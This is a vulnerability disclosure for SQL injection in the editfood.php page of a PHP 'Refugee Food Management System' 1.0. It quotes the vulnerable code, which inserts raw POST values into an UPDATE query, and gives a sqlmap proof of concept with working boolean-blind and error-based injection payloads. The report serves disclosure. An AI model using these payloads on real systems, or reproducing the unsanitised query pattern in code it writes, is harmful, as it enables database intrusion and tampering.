# SQLi in code-projects Refugee Food Management System 1.0 of file /home/editfood.php

**vender**:

- https://code-projects.org/refugee-food-management-system-in-php-with-source-code/

**SoftLink**:

- https://download.code-projects.org/details/491fdab9-7421-418b-93a2-bb506ba9cf02

**Vulnerable File**

- /home/editfood.php

**Version**

- V1.0

**Description**

A vulnerability was determined in code-projects Refugee Food Management System 1.0. The affected element is an unknown function of the file /home/editfood.php. This manipulation of the argument a causes sql injection. The attack is possible to be carried out remotely. The exploit has been publicly disclosed and may be utilized.

### Analyse

Line 36-44

```php
<?php
if(isset($_POST['Register'])){

$a = $_POST['a'];
$f = $_POST['b'];
$l = $_POST['c'];
$aa = $_POST['d'];

$qry1 = mysql_query(" UPDATE foodreg SET foodname='$f', qtyleft='$l',footType_typeid='$aa' WHERE fdid='$a' ");
	

```

### POC

```bash
sqlmap -u "http://192.168.93.1/Refugee/home/editfood.php" --cookie="PHPSESSID=b18e5od9eis7dbshtjrca24fs0" --data="a=admin&b=password&c=password&d=admin&Register=Register" --level=2
```



```bash
---
Parameter: a (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: a=admin' RLIKE (SELECT (CASE WHEN (5689=5689) THEN 0x61646d696e ELSE 0x28 END)) AND 'nVNP'='nVNP&b=password&c=password&d=admin&Register=Register

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: a=admin' AND GTID_SUBSET(CONCAT(0x716a767871,(SELECT (ELT(9526=9526,1))),0x716a6a6a71),9526) AND 'ndDK'='ndDK&b=password&c=password&d=admin&Register=Register
---
```



![image-20251224164837927](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512241648030.png)